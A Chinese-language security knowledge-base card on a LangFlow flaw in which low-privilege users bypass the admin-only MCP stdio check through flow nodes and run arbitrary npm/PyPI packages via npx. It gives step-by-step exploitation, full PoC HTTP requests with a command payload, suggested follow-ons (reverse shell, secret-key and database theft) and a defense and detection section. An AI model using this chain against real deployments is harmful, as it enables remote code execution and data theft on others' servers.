---
id: ai-security-mcp-security-langflow-flow-node-mcp-stdio-authorization-bypass
title: LangFlow 流程节点绕过 MCP stdio 管理员限制：任意 npm/PyPI 包执行
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: flow-node-mcp-stdio-authorization-bypass
tags:
- ai-security
- mcp
- stdio
- langflow
- authorization-bypass
- flow
- npx
- uvx
- rce
- tenant-isolation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V106
  verified_at: '2026-11-05T22:38:36+08:00'
  notes: 已对照原文与19张图核对：ensure_mcp_stdio_access 仅覆盖 /api/v2/mcp/servers（图03/04/05/06）、REST 直配 403（图02）、自定义组件 403（图08）、GET /api/v1/all 暴露 MCPTools 模板（图09/16）、mcp_server_allowed_packages 默认 None（图10）、ALLOWED_MCP_COMMANDS 含 npx/uvx/docker/sh/bash（图14）、创建流程（图17）与 /tmp/langflow_success 生成（图19）均一致。原文以 commit 09ef6b2b7119e35a6787fc249f916f8b47b28615 为基准，未给正式版本区间，故未设 versions；PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/ai-security/mcp-security/ai-security-mcp-security-langflow-flow-node-mcp-stdio-authorization-bypass/
draft: false
kb_aliases:
- LangFlow MCP stdio 授权绕过
- MCPTools 节点 RCE
- 流程图绕过 REST 校验
- npx uvx 任意包执行
- 任意 npm/PyPI 包代码执行
---

## 一句话结论

LangFlow 把 MCP stdio 服务器的管理员专属校验 `ensure_mcp_stdio_access` 只挂在 `/api/v2/mcp/servers` REST 路由上；任何已注册的低权用户都可以用 `POST /api/v1/flows/` 创建携带 MCPTools 组件的流程，把官方模板代码原样复制（通过 hash 校验），再把 stdio 命令写进不参与 hash 的 `mcp_server` 参数，最后 `POST /api/v1/run/{flow_id}` 触发 `npx`/`uvx` 下载并执行任意 npm/PyPI 包，以 LangFlow 服务用户权限完成 RCE。

## 原理

- **授权检查的位置缺陷**：`ensure_mcp_stdio_access(server_config, current_user, settings)` 的逻辑本身正确：当 `allow_custom_components=false` 或 `custom_component_admin_only=true` 时，stdio 服务器只允许 superuser 配置，否则返回 403。但全项目只有四个调用点，全部位于 `/api/v2/mcp/servers` REST 路由。直接调用该 REST 接口确实会被拦（原文截图显示 403 “MCP stdio servers are restricted to administrators…”）。
- **第二条入口：流程节点参数**：MCP stdio 配置还可以写在流程图的 MCPTools 组件参数里。`POST /api/v1/flows/` 创建流程、`POST /api/v1/run/{flow_id}` 触发执行时，调用链为 `update_tools → _connect_to_server → anyio.open_process`（POSIX）或 `create_windows_process`（Windows）；进程拉起边界只调用 `validate_mcp_stdio_config(command, args, env)`，检查命令内容、shell wrapper、危险环境变量等，不检查调用者身份。源码注释也明确承认“tenant-built flow can embed this stdio config directly in the MCPTools component value, bypassing REST-layer model validation”，但仍只做“shared policy”检查。
- **组件 hash 白名单只覆盖 `code` 字段**：`ALLOW_CUSTOM_COMPONENTS=false` 的设计意图是只允许运行 hash 与服务端已知模板一致的组件代码；`code_hash_matches_any_template` 只计算 `code` 字段的 hash。官方 MCPTools 组件源码可通过 `GET /api/v1/all` 被所有登录用户读取，攻击者原样复制即可通过 hash；恶意 stdio 命令写在 `mcp_server` 参数里，而该参数不参与 hash，因此白名单完全不生效。
- **命令白名单与解释器加固挡不住包运行器**：`ALLOWED_MCP_COMMANDS` 包含 `python`、`python3`、`npx`、`uvx`、`docker`、`cmd`、`sh`、`bash`。`LANGFLOW_MCP_SERVER_INTERPRETER_HARDENING=true` 只禁止 `python -c`/`node script` 等直调形态；`npx`/`uvx` 仍被允许。它们会从公共 registry 下载包并执行包的可执行文件，而像 `concurrently` 这类合法包本身就能把参数当命令运行，因此 `shlex.split` + `shell=False` 并不能阻止命令执行。
- **包允许列表默认关闭**：`mcp_server_allowed_packages` 默认 `None`，表示不限制包名；即使开启，`npx -y <pkg>`/`uvx --from <pkg>` 的包名与版本组合也需要额外校验，否则仍可指向攻击者控制的包。
- **执行权限**：进程以 LangFlow 服务用户身份运行；在原文的非开发加固环境中是普通用户 `kali`，但可读取应用配置、数据库、环境变量、其他租户数据，并作为跳板横向。若 LangFlow 以容器/root 运行，影响更大。
- **为什么加固环境仍然中招**：`ALLOW_CUSTOM_COMPONENTS=false`、`CUSTOM_COMPONENT_ADMIN_ONLY=true`、`MCP_SERVER_INTERPRETER_HARDENING=true`、`MCP_SERVER_DOCKER_HARDENING=true` 都只覆盖各自假设的路径；攻击者走的是“可信组件代码 + 不可信参数 + 允许的包运行器”组合，三者单独看都“合规”。

## 触发条件

- 目标 LangFlow 允许公开注册或存在任意低权账户（`LANGFLOW_ENABLE_SIGNUP=true`、`LANGFLOW_NEW_USER_IS_ACTIVE=true`）。
- 低权用户可以创建并运行流程（`POST /api/v1/flows/`、`POST /api/v1/run/{flow_id}`）。
- MCPTools 组件在 `GET /api/v1/all` 中可见，攻击者可复制官方模板代码。
- 服务端安装了 `npx`/`uvx` 之一，且允许访问 npm/PyPI registry。
- `mcp_server_allowed_packages` 未配置或配置过宽；`MCP_SERVER_INTERPRETER_HARDENING` 等只挡直调解释器。
- 流程执行时会在服务端拉起 MCP stdio 进程（而非仅在客户端执行）。

## 利用步骤

1. 注册低权账户并登录：`POST /api/v1/users/`（公开注册）→ `POST /api/v1/login` 获取 access token。
2. 读取组件模板：`GET /api/v1/all`，找到 `MCPTools` 的 `code.value`，原样保存（保证 hash 与服务端模板一致）。
3. 创建恶意流程：`POST /api/v1/flows/`，节点类型 `MCPTools`，`code.value` 填官方模板原文，`mcp_server.value.config` 填 `{"command": "npx", "args": ["-y", "concurrently", "touch /tmp/langflow_success"]}`；记录返回的 flow id。
4. 如运行接口要求 API key，先 `POST /api/v1/api_key/` 签发 key。
5. 触发执行：`POST /api/v1/run/{flow_id}`，服务端 `update_tools → _connect_to_server → anyio.open_process` 拉起 `npx`，下载 `concurrently` 并执行其参数中的命令。
6. 验证：检查 `/tmp/langflow_success` 是否生成；将命令替换为反弹 shell、读取 `~/.cache/langflow/secret_key`、导出数据库/环境变量、下载二阶段载荷。
7. 清理/持久化：删除流程或保留低权账户；若有 API key，可重复触发。

## PoC

原文的关键请求（省略 58KB 的完整组件模板，`code.value` 填 `GET /api/v1/all` 返回的 MCPTools 原文）：

```http
POST /api/v1/users/ HTTP/1.1
Host: TARGET:7861
Content-Type: application/json

{"username":"test","password":"test"}
```

```http
POST /api/v1/login HTTP/1.1
Host: TARGET:7861
Content-Type: application/x-www-form-urlencoded

username=test&password=test
```

```http
POST /api/v1/flows/ HTTP/1.1
Host: TARGET:7861
Authorization: Bearer <TOKEN>
Content-Type: application/json

{
  "name": "job-1787151281",
  "description": "d",
  "is_component": false,
  "data": {
    "nodes": [
      {
        "id": "m",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "id": "m",
          "type": "MCPTools",
          "display_name": "MCPTools",
          "node": {
            "template": {
              "_type": "Component",
              "code": {
                "type": "code",
                "required": true,
                "value": "<MCPTools 原样复制，保证 hash 匹配>"
              },
              "mcp_server": {
                "type": "mcp",
                "name": "mcp_server",
                "value": {
                  "name": "helper",
                  "config": {
                    "command": "npx",
                    "args": ["-y", "concurrently", "touch /tmp/langflow_success"]
                  }
                },
                "required": false,
                "show": true,
                "_input_type": "MCPInput"
              }
            },
            "outputs": [
              {"name": "response", "display_name": "R", "method": "build_output", "types": ["Tool"], "selected": "Tool"}
            ],
            "base_classes": ["object"],
            "display_name": "MCPTools"
          }
        }
      }
    ],
    "edges": [],
    "viewport": {}
  }
}
```

```http
POST /api/v1/run/<FLOW_ID> HTTP/1.1
Host: TARGET:7861
Authorization: Bearer <TOKEN>
Content-Type: application/json
```

```text
# 原文验证：/tmp/langflow_success 被创建，证明 npx 下载 concurrent 并执行了参数命令。
# 说明：直接 POST /api/v2/mcp/servers/npx 会被 403 拦截；流程节点路径不经过该授权检查。
```

## 变体与关联

- **同类入口**：插件/扩展清单、项目配置、工作流节点参数、A2A 卡片、webhook 配置等；凡是能携带 `command`/`args` 且不参与代码 hash 的字段，都可能成为绕过点。
- **组件白名单绕过**：hash 只覆盖 `code` 不覆盖相邻参数；对代码做等价变换（注释、格式）也可能改变 hash，但复制官方代码是最稳的。
- **包运行器变体**：`npx -y <pkg>`、`uvx --from <pkg> <cmd>`、`npm exec`、`pnpm dlx`、`yarn dlx`、`bunx`；合法包中带命令执行能力的工具（如 `concurrently`、`npm-run-all`）可直接当命令执行器。
- **传输变体**：MCP `stdio` 直接起进程；`http`/`sse` 可 SSRF 到内网；Docker transport 可尝试挂载/网络模式（若 hardening 未覆盖）。
- **关联卡片**：[[ai-security-mcp-stdio-endpoint-command-injection]]（MCP stdio endpoint 直拼 `sh -c` 的命令注入）、[[ai-security-mcpjam-inspector-api-mcp-connect-rce]]（serverConfig command/args 直接启动进程）、[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（同一产品的公开流程自定义组件 exec）。
- **边界**：原文以 LangFlow commit `09ef6b2b7119e35a6787fc249f916f8b47b28615` 为代码基准，未标注正式受影响版本区间；不同版本的字段名/授权位置可能变化。PoC 依赖服务端安装 `npx` 且能访问 registry，未在本机复跑。

## 检测与防御

- **授权下沉到进程边界**：在 `_connect_to_server`/`anyio.open_process` 之前校验调用者身份、流程所有者/租户、组件来源与审批状态，而不是只在 REST 路由检查；流程内嵌 stdio 配置必须经过与 REST 相同（或更严）的 admission。
- **完整性覆盖所有安全字段**：组件 hash 应覆盖 `code`、`mcp_server`、`command`、`args`、`env` 等全部可执行字段；对字段做规范化后计算，变更即失效；不要只对代码做 hash。
- **默认拒绝包运行器**：MCP stdio 禁止 `npx`/`uvx`/`npm exec`/`pnpm dlx` 等包运行器；如必须使用，设置 `mcp_server_allowed_packages` 为显式包名+版本+hash 的白名单，并配合私有 registry/镜像。
- **沙箱与最小权限**：MCP stdio 进程以低权用户运行，容器只读文件系统、禁用 host 网络/挂载、seccomp/AppArmor、出站 allowlist；限制对数据库、密钥、其他租户数据的访问。
- **租户隔离**：流程创建/运行按租户隔离；低权用户不能创建或运行含 MCP stdio 的流程；对高风险组件要求管理员审批。
- **检测**：审计含 `MCPTools`/`mcp_server` 的流程；监控 `npx`/`uvx`/`node` 子进程、registry 下载、`/tmp` 下新增文件、异常外联；对比 REST 403 与 flow 运行成功的不一致；记录组件 hash 与参数来源。
